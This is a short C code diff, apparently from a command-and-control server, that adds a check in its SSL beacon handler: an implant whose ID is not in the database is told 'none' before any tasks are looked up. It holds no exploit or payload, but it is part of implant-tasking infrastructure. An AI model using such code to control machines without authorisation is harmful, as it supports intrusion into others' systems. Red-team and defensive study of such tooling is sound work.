@@ -35,6 +35,14 @@ void ssl_beacon(cJSON *json, SSL *ssl) {
     // validate if agent id exists in the database.
     
     
+    if (check_implant_id(implant_id->valuestring) == 0) {
+        cJSON_AddStringToObject(json_reply, "mode", "none");
+        char *reply = cJSON_Print(json_reply);
+        SSL_write(ssl, reply, strlen(reply));
+        free(reply);
+        cJSON_Delete(json_reply);
+        return;
+    }
 
 
     // check if there are tasks queue for agent
